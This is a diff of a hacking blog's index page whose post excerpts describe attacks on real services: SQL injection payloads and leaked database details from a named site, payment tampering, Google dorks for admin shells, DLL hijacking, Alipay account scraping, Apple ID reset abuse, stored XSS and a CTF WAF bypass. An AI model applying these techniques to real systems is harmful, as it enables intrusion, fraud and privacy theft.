@@ -45,29 +45,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-02T07:59:05.000Z" itemprop="datePublished">
-          2012-07-02
+      <time datetime="2013-03-27T21:01:28.000Z" itemprop="datePublished">
+          2013-03-28
       </time>
     
     
     | 
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/post/'>post</a>
+    <a href='/tag/支付宝/'>支付宝</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/619.seo/">淘宝网某处存在严重支付漏洞</a></h2>
+      <h2 class="post-title"><a href="/983.seo/">抓取谷歌搜索结果里的支付宝帐号</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>转自乌云<a href="http://www.wooyun.org/bugs/wooyun-2010-07293">http://www.wooyun.org/bugs/wooyun-2010-07293</a></p>  <p>漏洞详情</p>  <p>披露状态：</p>  <p>2012-05-18： 细节已通知厂商并且等待厂商处理中   <br />2012-05-18： 厂商已经确认，细节仅向厂商公开    <br />2012-05-28： 细节向核心白帽子及相关领域专家公开    <br />2012-06-07： 细节向普通白帽子公开    <br />2012-06-17： 细节向实习白帽子公开    <br />2012-07-02： 细节向公众公开</p>  <p>简要描述：</p>  <p>淘宝网某处存在支付漏洞，未使用SSL加密支付过程，同时，对支付过程相关代码的审计存在一定缺陷，导致漏洞产生。会导致允许用户对支付金额进行修改，给厂商带来很大的利益损失。</p>  <p>详细说明：</p>  <p>在阿里旺旺2012中，使用短信旺旺中心对短信条数进行充值，在该过程中，未使用SSL安全连接，同时存在支付漏洞。   <br />选择充值的金额后，下一步，使用<a href="http://ha.cker.in/tag/Fiddler" target="_blank">Fiddler</a>截取数据包，GBK编码，修改POST数据中的数据，seriesPrice为支付的金额，seriesNum为充值的条数，这两个地方理论上都可以进行修改，这里以修改seriesPrice为例。</p>  <p>漏洞证明：</p>  <p>充值前截图</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/bdc6a26da239_15137/clip_image001.jpg" width="532" height="443" /></p>
+        支付宝转账信息能够被谷歌抓取，大量用户隐私信息被泄露。    练习php写了个提取支付宝帐号的程序     &lt;?php/ Build:2013-3-28
+
+ Author:Secer Encoding:UTF-8
+
+ http://www.googlestable.com/search?q=site:shenghuo.alipay.com+%E8%BD%AC%E8%B4%A6%E7%BB%93%E6%9E%9C&amp;hl=zh
       
       </p>
       
       <p>
-          <a href="/619.seo/" class="excerpt-link">Read More...</a>
+          <a href="/983.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -76,29 +78,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-02T06:06:45.000Z" itemprop="datePublished">
-          2012-07-02
+      <time datetime="2013-03-27T06:49:01.000Z" itemprop="datePublished">
+          2013-03-27
       </time>
     
     
     | 
-    <a href='/tag/拿shell/'>拿shell</a>,
-    
-    <a href='/tag/突破星外/'>突破星外</a>
+    <a href='/tag/社会工程学/'>社会工程学</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/616.seo/">关于后台只读备份拿shell</a></h2>
+      <h2 class="post-title"><a href="/982.seo/">社会工程学之诱饵攻击真实案列</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>今天在旁注一个站点的过程中遇到了一个十分有意思的站,拿出来跟大家分享下.&#160; 小菜文章没技术含量大牛路过    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; margin-left: 0px; border-top: 0px; margin-right: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/shell_14827/clip_image001.jpg" width="590" height="364" />这是这个站的后台用 账号admin密码admin进去以后发现里面是精良的框架搭建的</p>
+        近日，安全公司Trustwave的SpiderLabs实验室做了一系列社会工程学的实验，使用了社工种经典的手法，证明这些手法仍然非常有效，利用人的好奇心获得了需要的信息。  详细过程：  首先SpiderLabs收集了目标公司员工名单信息，包含姓名、住址等，然后决定使用让用户更新自己的杀毒软件的方法进行攻击。  SpiderLabs提供了一个社工中攻击的经典模板，并与U盘或CD光盘一起寄送给目标用户，模板内容如下：  亲爱的员工XX（直
       
       </p>
       
       <p>
-          <a href="/616.seo/" class="excerpt-link">Read More...</a>
+          <a href="/982.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -107,31 +107,22 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-28T07:52:56.000Z" itemprop="datePublished">
-          2012-06-28
+      <time datetime="2013-03-25T05:08:39.000Z" itemprop="datePublished">
+          2013-03-25
       </time>
     
-    
-    | 
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/sinopass/'>sinopass</a>,
-    
-    <a href='/tag/后台/'>后台</a>
-    
-    
 </span>
-      <h2 class="post-title"><a href="/614.seo/">sinopass后台管理系统漏洞</a></h2>
+      <h2 class="post-title"><a href="/981.seo/">中国黑客传说：游走在黑暗中的精灵</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        无意中发现：   关键词：inurl:About.asp?i_type=   自己尝试了一下&#160; 基本上都是的   后台：admin/login.asp&#160; 或者manage   拿shell方法:数据库备份&#160; 或者ewebeditor   有ewebeditor默认路径&#160; 默认数据库的&#160; 后台帐号密码可以注入&#160; 注入漏洞蛮多的 添加字段 a_name a_pass
+        <p>声明：本文内容禁止讲给16岁以下的小朋友听，以免吓坏小朋友。出于保护当事人的原因，禁止任何人在任何时候以任何理由向我打听其人其事，我不会做出任何回复。我不对本文的真实性负责。本文禁止任何媒体转载，但允许个人转载至微博或个人博客！</p>  <p>本文中所有的人物都将匿名，请不要去猜测他是谁，也请不要试图寻找他，这只会给你我都带来不必要的麻烦。如果你竟然强大到能够以势压人，那么我的回答只会有一个：“我在微信里胡乱吹牛B的，这你也信？”，所以请不要浪费你我的时间。</p>  <p>—— 我是膜拜的分割线 ——</p>  <p>他是我所认识的最强大的地下黑客之一，在本文中我姑且称他为V。</p>  <p>之所以是之一，是因为我还认识另外一个叫A的黑客，A宣称自己成功入侵了包括Google、Facebook、Twitter等你几乎能叫得上名字的所有大型互联网公司。</p>  <p>而V要低调的多。</p>  <p>我认为V已经是地下黑客世界中的王者，虽然他从不肯告诉我他入侵的那些公司的名字，但我仍然会毫不犹豫的将他列为当今世界上最强大的黑客之一。</p>  <p>V至今仍恪守着古老的黑客守则，就如同中世纪的骑士们执着于骑士精神一般。他从不在任何公众场合谈论入侵了什么网站，入侵后也从不删除数据或是进行破坏，他也不会用入侵获得的成果来牟利。</p>  <p>V只是一个人，他的身后没有任何的机构或组织，因此才更加的难能可贵。</p>  <p><a href="http://img.cker.in/b639c95ee231_1260A/clip_image001.jpg"></a></p><br>
       
       </p>
       
       <p>
-          <a href="/614.seo/" class="excerpt-link">Read More...</a>
+          <a href="/981.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -140,27 +131,22 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-28T07:48:16.000Z" itemprop="datePublished">
-          2012-06-28
+      <time datetime="2013-03-24T20:51:01.000Z" itemprop="datePublished">
+          2013-03-25
       </time>
     
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>
-    
-    
 </span>
-      <h2 class="post-title"><a href="/611.seo/">记新手的一次渗透入侵</a></h2>
+      <h2 class="post-title"><a href="/980.seo/">修改任意apple ID密码</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><table border="0" cellspacing="0" cellpadding="0"><tbody>     <tr>       <td>         <p>一年前把，<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a><b></b>了，这次发现不是root，但帐户支持load_file()            <br />Ps：我严重鄙视挂马的人，还有那些黑心贩子。。。            <br />Ps：我从一开始写文章到现在，不屏蔽<b>渗透</b>的地址连接，主要的原因还是希望            <br />大家可以通过我的文章，真正实践性滴学习本文内容，新人朋友可以一步步滴实践操作            <br />【懒得扯淡了，希望大家那个什么什么什么，你们懂的，人品很重要】            <br /><a href="http://www.czxtaiji.net/content.php?theMenuId=4&amp;theSubMenuId=1&amp;theArticleId=48%20and%201=2">http://www.czxtaiji.net/content. … leId=48%20and%201=2</a>            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 947            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 948            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 949            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 950            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 951            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 952            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 953            <br />获取到路径：d:\czxsite\bin\sys\config.php            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/0a82505b9f50_14E77/clip_image002.jpg" width="604" height="316" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=48 order by 9            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/0a82505b9f50_14E77/clip_image004.jpg" width="604" height="240" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,5,6,7,8,9            <br />Warning: disparticlecontent(7): failed to open stream: No such file or directory in d:\czxsite\bin\sys\config.php on line 976            <br />Warning: disparticlecontent(): Failed opening ‘7’ for inclusion (include_path=’.;c:\php4\pear’) in d:\czxsite\bin\sys\config.php on line 976            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,user(),database(),7,8,version()            <br />user():czxtaiji@localhost            <br />version():4.0.18-nt&#160;&#160; <br />database():czxtaiji            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/0a82505b9f50_14E77/clip_image006.jpg" width="604" height="237" /></p>       </td>     </tr>   </tbody></table>
+        利用前提：知道受害者的apple id及其注册时的出生日期   利用步骤：    第一步：登录https://iforgot.apple.com/iForgot/iForgot.html，填写指定的apple id，点击下一步    第二步：选择验证方法—— 回答安全提示问题，点击下一步    第三步：填写apple id注册时填写的出生日期    第四步：开启web代理工具（我习惯用burpsuite），点击下一步，  漏洞证明：  
       
       </p>
       
       <p>
-          <a href="/611.seo/" class="excerpt-link">Read More...</a>
+          <a href="/980.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -169,27 +155,22 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-28T07:38:55.000Z" itemprop="datePublished">
-          2012-06-28
+      <time datetime="2013-03-20T17:28:36.000Z" itemprop="datePublished">
+          2013-03-21
       </time>
     
-    
-    | 
-    <a href='/tag/网络安全/'>网络安全</a>
-    
-    
 </span>
-      <h2 class="post-title"><a href="/609.seo/">某大型企业局域网安全解决方案</a></h2>
+      <h2 class="post-title"><a href="/979.seo/">买卖宝存储型xss盲打后台</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>第一章 总则 </p>  <p>本方案为某大型局域网<a href="http://ha.cker.in/tag/网络安全" target="_blank">网络安全</a>解决方案，包括原有网络系统分析、安全需求分析、安全目标的确立、安全体系结构的设计、等。本安全解决方案的目标是在不影响某大型企业局域网当前业务的前提下，实现对他们局域网全面的安全管理。 </p>  <p>1.将安全策略、硬件及软件等方法结合起来，构成一个统一的防御系统，有效阻止非法用户进入网络，减少网络的安全风险。    <br />2.定期进行漏洞扫描，审计跟踪，及时发现问题，解决问题。     <br />3.通过入侵检测等方式实现实时安全监控，提供快速响应故障的手段，同时具备很好的安全取证措施。     <br />4.使网络管理者能够很快重新组织被破坏了的文件或应用。使系统重新恢复到破坏前的状态，最大限度地减少损失。     <br />5.在工作站、服务器上安装相应的防病毒软件，由中央控制台统一控制和管理，实现全网统一防病毒。 </p>  <p>第二章 网络系统概况 </p>  <p>2.1 、网络概况    <br />这个企业的局域网是一个信息点较为密集的千兆局域网络系统，它所联接的现有上千个信息点为在整个企业内办公的各部门提供了一个快速、方便的信息交流平台。不仅如此，通过专线与Internet的连接，打通了一扇通向外部世界的窗户，各个部门可以直接与互联网用户进行交流、查询资料等。通过公开服务器，企业可以直接对外发布信息或者发送电子邮件。高速交换技术的采用、灵活的网络互连方案设计为用户提供快速、方便、灵活通信平台的同时，也为网络的安全带来了更大的风险。因此，在原有网络上实施一套完整、可操作的安全解决方案不仅是可行的，而且是必需的。 </p>  <p>2.1.1 、网络概述 </p>  <p>这个企业的局域网，物理跨度不大，通过千兆交换机在主干网络上提供1000M的独享带宽，通过下级交换机与各部门的工作站和服务器连结，并为之提供100M的独享带宽。利用与中心交换机连结的Cisco 路由器，所有用户可直接访问Internet。 </p>  <p>2.1.2 、网络结构 </p>  <p>这个企业的局域网按访问区域可以划分为三个主要的区域：Internet区域、内部网络、公开服务器区域。内部网络又可按照所属的部门、职能、安全重要程度分为许多子网，包括：财务子网、领导子网、办公子网、市场部子网、中心服务器子网等。在安全方案设计中，我们基于安全的重要程度和要保护的对象，可以在Catalyst 型交换机上直接划分四个虚拟局域网（VLAN），即：中心服务器子网、财务子网、领导子网、其他子网。不同的局域网分属不同的广播域，由于财务子网、领导子网、中心服务器子网属于重要网段，因此在中心交换机上将这些网段各自划分为一个独立的广播域，而将其他的工作站划分在一个相同的网段。（图省略） </p>
+        <p>买卖宝<a href="http://ha.cker.in/tag/XSS" target="_blank">存储型xss</a>两枚，成功盲打后台，劫持的cookie中尽然有用户名密码信息。。。</p>  <p>详细说明：</p>  <p>1、第一处<a href="http://ha.cker.in/tag/XSS" target="_blank">xss</a>在用户的收获地址处，详细地址为任何过滤，导致xss。</p>  <p><a href="http://www.wooyun.org/upload/201302/04163133017b93675cd4efd581d8d3929eacd7be.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/xss_8523/clip_image001.jpg" width="584" height="614" /></a></p>  <p><a href="http://www.wooyun.org/upload/201302/041631533b15266c251df2205494de0d326a66a7.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/xss_8523/clip_image003.jpg" width="604" height="448" /></a></p>  <p>2、第二处在用户反馈处，反馈内容为做任何过滤，导致xss。</p><br>
       
       </p>
       
       <p>
-          <a href="/609.seo/" class="excerpt-link">Read More...</a>
+          <a href="/979.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -198,29 +179,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-25T08:32:36.000Z" itemprop="datePublished">
-          2012-06-25
+      <time datetime="2013-03-11T17:22:13.000Z" itemprop="datePublished">
+          2013-03-12
       </time>
     
     
     | 
-    <a href='/tag/提权/'>提权</a>,
-    
-    <a href='/tag/Zend/'>Zend</a>
+    <a href='/tag/WAF/'>WAF</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/606.seo/">通过Zend目录权限不严获取执行权限</a></h2>
+      <h2 class="post-title"><a href="/978.seo/">Bypassing WAF via HTTP Parameter Pollution</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>服务器上很多都装了 Zend   <br />就算 C:\Program Files\ 设置过权限，安装Zend后，Zend 会自动配置目录的权限    <br />C:\Program Files\Zend\ZendOptimizer-3.3.0\ 下的目录权限为 Everyone 全权,这导致入侵者能写入文件。    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Zend_78D/clip_image001.jpg" width="615" height="607" />    <br />如果黑客入侵一个服务器，只支持 asp,或php,没有执行权限，执行组件也给禁用了，只有读写文件的权限(只要读写权限就够)。    <br />但 C:\Program Files\Zend\ZendOptimizer-3.3.0\lib 下有 ZendExtensionManager.dll 文件，    <br />而这个文件就算加载了，也能通过&quot;重命名&quot;得以修改。    <br />而黑客只要把这个DLL换成黑客的DLL，将能加载起来！    <br />在测试中发现，如果直接换上DLL，替换的DLL不能被Zend加载！    <br />转换思路，软件应该是加载相关DLL再查看相关接口!&#160;&#160; <br />Zend 加载 -&gt; 替换后的dll(文件名用 ZendExtensionManager.dll ) -&gt; 加载原DLL (这是原文件，把他改为名 ZendExtensionManager.dll.log 让自己的加载他)    <br />测试能成功加载！</p>
+        <p>Last week I was invited to join a team to participate in a CTF (Capture The Flag) contest organized by <a href="https://csawctf.poly.edu/">CSAW</a> Team.</p>  <p>   <br />With my wife and kids around, I only had the opportunity to pick one challenge related to Web Exploitation named: &quot;HorceForce&quot; worth 300 points! Basically, you were provided with a low-privilege account and needed to find your way to get Administrator access.</p>  <p>   <br />So, there are multiple resources explaining how to exploit it, but definitely I want to share my experience.</p>  <p>   <br />After sending some single quotes it was easy to find a SQL Injection bug by getting the well known &quot;MySQL SQL Error Message&quot;.</p>  <p>   <br />So, as you all know the first attempt was something like:</p>  <p>   <br /><font color="#00ff40"><a href="http://128.238.66.217/horse.php?id=7">http://128.238.66.217/horse.php?id=7</a> or 1 IN (select current_user)</font></p>  <p>   <br />And I got I ERROR Message saying something like &quot;PLEASE STOP trying to hack this blablablabla site&quot;.</p>  <p>   <br />Then after many techniques to bypass the filter I realized the <a href="http://ha.cker.in/tag/WAF" target="_blank">WAF</a> was configured to deny any string containing either &quot;select&quot; or &quot;union&quot;, blindly I assumed the WAF’s regular expression was something like:</p>  <p>   <br />/^.<em>select.</em>$/ or /^.<em>union.</em>$/ </p>  <p>   <br />Which means, every string which even makes no sense from SQLi point of view like: <font color="#00ff00">blablaSELECTblabla</font> or a bypass technique like: <font color="#00ff00">/<em>!union</em>/</font> , were triggering the Warning Message.</p>  <p>   <br />After some research I found the <a href="http://www.acunetix.com/blog/whitepaper-http-parameter-pollution/">HTTP Pollution</a> technique which basically allows the attacker (among other things) to play with the GET Parameters in order to confuse the WAF filter.</p>  <p>   <br />So, how it works?</p>  <p>   <br />Let’s say you have the GET parameter &quot;id&quot;, you can duplicate it (or even add it many times) and send something like:</p>  <p>   <br /><font color="#00ff00">?id=value1&amp;id=value2</font></p>  <p>   <br />And, depending on the Framework used (PHP, Java, ASP.NET, etc) the parameters are going to be parsed differently, in our case with Apache/PHP, if you inject the same parameter multiple times, only the last one will be parsed by the Framework (see table below) but guess what? Only the first parameter is going to be analyzed by the WAF!</p>  <p>   <br />This means, by injecting: ?id=7&amp;id=[SQLi]</p>  <p>   <br />WAF Network Layer parses&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; id=7&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;- Good to go!     <br />PHP Application Layer parses&#160;&#160;&#160;&#160;&#160;&#160; id=[SQLi]&#160;&#160;&#160;&#160; &lt;- SQLi successfully injected</p>  <p>   <br />So, this is a typical example where you can inject something that is going to be treated differently at Network Layer and Application Layer.</p>  <p>   <br />Below is a table where you can find how other Frameworks react when receiving the same parameter multiple times. Like ASP.NET, if it receives two parameters, it will concatenate them, and therefore you can split the attack into those fields to bypass the WAF, which is out of scope of this blog.</p>  <p><a href="http://img.cker.in/BypassingWAFviaHTTPParameterPollution_13D64/clip_image001.jpg"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/BypassingWAFviaHTTPParameterPollution_13D64/clip_image001_thumb.jpg" width="1284" height="740" /></a></p><br>
       
       </p>
       
       <p>
-          <a href="/606.seo/" class="excerpt-link">Read More...</a>
+          <a href="/978.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -228,7 +207,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/page/24/">← Newer Posts</a>
-    <span class="page-number">Page 25 of 57</span>
+    <span class="page-number">Page 25 of 81</span>
     <a class="older-posts" href="/page/26/">Older Posts →</a>
   </nav>
 </main>
